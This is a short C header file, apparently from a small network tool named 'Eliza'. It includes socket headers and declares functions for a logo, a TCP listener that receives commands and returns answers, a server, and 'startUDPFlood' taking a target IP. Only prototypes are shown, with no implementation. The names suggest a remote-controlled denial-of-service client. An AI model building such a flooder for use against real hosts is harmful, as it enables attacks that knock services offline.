#include "stdio.h"
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdio.h>

void showElizaLogo();
void simpleListenTcp(char ip_adresse[], unsigned short int port, char befehl[], int size_befehl, char * antwort);
void startElizaServer();
void startUDPFlood(char targetip[]);
